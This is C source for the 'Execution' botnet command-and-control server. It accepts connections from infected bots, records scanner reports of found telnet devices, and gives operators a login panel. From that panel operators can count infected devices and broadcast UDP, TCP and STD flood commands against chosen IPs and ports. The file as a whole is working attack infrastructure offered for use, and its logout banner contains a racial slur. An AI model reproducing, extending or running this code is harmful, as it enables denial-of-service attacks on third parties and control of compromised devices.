// Execution Server Side
// created by Kaden
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events; //63baa0de836563928e2bd9737cb8f8ad
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1; //63baa0de836563928e2bd9737cb8f8ad
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *TitleWriter(void *sock) {
	int find_line;
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices Infected [ %d ] | [ %s ] - Users Online [ %d ]%c", '\033', BotsConnected(), accounts[find_line].username, OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return NULL;
		sleep(2);
		}
}	

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[0;91mBenutzer\e[97m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[0;91mPasswort\e[97m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

		char yes1 [1000];
		char yes2 [1000];
		char yes3 [1000];
		char yes4 [1000];
		char yes5 [1000];
		
		sprintf(yes1,  "\e[0;91mBitte warten Sie ... Ich überprüfe Ihre Anmeldeinformationen \e[97m[\e[0;91m|\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes2,  "\e[0;91mBitte warten Sie ... Ich überprüfe Ihre Anmeldeinformationen \e[97m[\e[0;91m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes3,  "\e[0;91mBitte warten Sie ... Ich überprüfe Ihre Anmeldeinformationen \e[97m[\e[0;91m-\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes4,  "\e[0;91mBitte warten Sie ... Ich überprüfe Ihre Anmeldeinformationen \e[97m[\e[0;91m/\e[97m]\r\n", accounts[find_line].username);
		sprintf(yes5,  "\e[0;91mWillkommen im Botnet\r\n");
		
		
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes1, strlen(yes1), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes2, strlen(yes2), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes3, strlen(yes3), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes4, strlen(yes4), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes5, strlen(yes5), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		
        goto Banner;
        }
	
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char lmfao9asciibannerline1   [5000];
		char lmfao9asciibannerline2   [5000];
		char lmfao9asciibannerline3   [5000];
		char lmfao9asciibannerline4   [5000];
		char lmfao9asciibannerline5   [5000];
		char lmfao9asciibannerline6   [5000];
		char lmfao9asciibannerline7   [5000];
		char lmfao9asciibannerline8   [5000];
		
  sprintf(lmfao9asciibannerline2,   "\e[0;91m d88888b db    db d88888b  .o88b. db    db d888888b d888888b  .d88b.  d8b   db\r\n");           
  sprintf(lmfao9asciibannerline3,   "\e[0;91m 88'     `8b  d8' 88'     d8P  Y8 88    88 `~~88~~'   `88'   .8P  Y8. 888o  88\r\n");  
  sprintf(lmfao9asciibannerline4,   "\e[0;91m 88ooooo  `8bd8'  88ooooo 8P      88    88    88       88    88    88 88V8o 88\r\n");             
  sprintf(lmfao9asciibannerline5,   "\e[0;91m 88~~~~~  .dPYb.  88~~~~~ 8b      88    88    88       88    88    88 88 V8o88\r\n");            
  sprintf(lmfao9asciibannerline6,   "\e[0;91m 88.     .8P  Y8. 88.     Y8b  d8 88b  d88    88      .88.   `8b  d8' 88  V888\r\n");               
  sprintf(lmfao9asciibannerline7,   "\e[0;91m Y88888P YP    YP Y88888P  `Y88P' ~Y8888P'    YP    Y888888P  `Y88P'  VP   V8P\r\n");              
  sprintf(lmfao9asciibannerline8,   "\e[90m														    \r\n");						

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "BOTS")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[0;91mBots Connected: \e[97m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, "\e[0;91mTel Bots: \e[97m%d\r\n", TELFound, scannerreport);
				sprintf(ops,         "\e[0;91mUsers Online: \e[97m%d\r\n", OperatorsConnected, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return NULL;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return NULL;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return NULL;
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp1  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp9  [800];
				char hp10  [800];
				char hp11  [800];
				char hp12  [800];
				char hp13  [800];

				sprintf(hp1,  "\e[97m>---\e[0;91mList Of Commands\e[97m---<\r\n");
				sprintf(hp4,  "\e[97m!* STD IP PORT TIME\r\n");
				sprintf(hp5,  "\e[97m!* UDP IP PORT TIME 32 1337 400\r\n");
				sprintf(hp6,  "\e[97m!* TCP IP PORT TIME 32 all 1337 400\r\n");
				sprintf(hp7,  "\e[97m>---\e[0;91mServerside Commands\e[97m---<\r\n");
				sprintf(hp9,  "\e[97m!* CLEAN\r\n");
				sprintf(hp10, "\e[97m!* UPDATE\r\n");
				sprintf(hp11, "\e[97m!* KILLATTK\r\n");
				sprintf(hp12, "\e[97mCLEAR\r\n");
				sprintf(hp13, "\e[97mLOGOUT\r\n");

				if(send(datafd, hp1,  strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp9,  strlen(hp9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp10,  strlen(hp10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp11,  strlen(hp11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp12,  strlen(hp12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp13,  strlen(hp13), MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* BOTKILL")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL\r\n");
				broadcast(buf, datafd, gtfomynet);
				continue;
			}
			if(strstr(buf, "STOP"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[97m[\e[0;91mExecution\e[97m] \e[31mATTACKS STOPPED\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "CLEAR")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "clear")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "LOGOUT")) {
			pthread_create(&title, NULL, &TitleWriter, sock);
			char logoutmessage1 [2048];
			char logoutmessage2 [2048];
			char logoutmessage3 [2048];
			char logoutmessage4 [2048];
			char logoutmessage5 [2048];
			char logoutmessage6 [2048];

			sprintf(logoutmessage1, "\e[90m        _    _\r\n");
			sprintf(logoutmessage2, "     \e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\r\n");
			sprintf(logoutmessage3, "\e[97m   \e[31m_\e[97m|\e[31m____________\e[97m|\e[31m__\r\n");
			sprintf(logoutmessage4, "\e[31m  |o o o o o o o o /  \r\n");
			sprintf(logoutmessage5, "\e[96m~~~~~~~~~~~~~~~~~~~~~~~~\r\n");
			sprintf(logoutmessage6, "\e[34mBIG BOATS MY NIGGA, YEET\r\n");

			if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage2, strlen(logoutmessage2), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage3, strlen(logoutmessage3), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage4, strlen(logoutmessage4), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage5, strlen(logoutmessage5), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage6, strlen(logoutmessage6), MSG_NOSIGNAL) == -1)goto end;
			sleep(5);
			goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, "\e[0;91mExecution\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], char **sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [Bot-Port] [Threads] [Cnc-Port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("Execution Botnet Screened\n");
		printf("\e[0;91mCreated by Kaden\x1b[1;37m\n");
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}